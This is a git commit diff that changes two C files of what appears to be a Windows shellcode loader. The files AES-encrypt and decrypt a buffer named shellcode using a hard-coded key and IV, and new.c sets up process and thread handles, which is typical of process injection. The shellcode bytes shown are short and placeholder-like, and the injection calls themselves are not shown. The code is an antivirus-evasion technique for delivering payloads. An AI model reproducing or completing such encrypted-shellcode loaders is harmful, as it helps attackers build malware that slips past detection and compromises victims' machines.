f3df65580c79539cdfacfa7c0a8daf823d8d8921
malefax <shiven52002@gmail.com>
2024-01-02 20:57:04 +0530

    aes 256 added

--- decrypt.c
+++ decrypt.c
@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include "aes.h"
 int main(int argc, char*argv[]) {
-uint8_t raw_shell [] =  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+uint8_t raw_shell[] =  "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
 /*int i;
 char key = '!';
 printf("encrypted buffer\n");
@@ -12,12 +12,12 @@ for ( i = 0; i < sizeof(raw_shell); i++)
 // copy the encrypted shellcode to the shellcode variable in new.c file
 struct AES_ctx ctx;
 uint8_t key[] = "1@_2wa&^r4";
-uint8_t iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
+uint8_t  iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
 AES_init_ctx_iv(&ctx, key, iv);
-AES_CBC_encrypt_buffer(&ctx, raw_shell, sizeof(raw_shell));
+AES_CBC_decrypt_buffer(&ctx,raw_shell,sizeof(raw_shell));
 printf("Encrypted buffer:\n");
 
-	for (int i = 0; i < sizeof(raw_shell)-1 ; i++) {
+	for (int i = 0; i < sizeof(raw_shell) - 1; i++) {
 		printf("\\x%02x", raw_shell[i]);
 
 	}
--- new.c
+++ new.c
@@ -2,12 +2,13 @@
 #include <string.h>
 #include <Windows.h>
 #include "aes.h"
+
 int main(int argc, char* argv[]){
     DWORD pid=0;
     DWORD tid=0;
     HANDLE hprocess,hthread=NULL;
     LPVOID base =NULL;
-    unsigned char shellcode[] = "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
+    uint8_t shellcode[] = "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
     /*int i;
     char key = '!';
     for ( i = 0; i < sizeof(shellcode)-1; i++)
@@ -16,8 +17,8 @@ int main(int argc, char* argv[]){
     }
     */
    struct AES_ctx ctx;
-   unsigned char key[] = "1@_2wa&^r4";
-   unsigned char  iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
+   uint8_t key[] = "1@_2wa&^r4";
+   uint8_t iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx,shellcode,sizeof(shellcode));
 
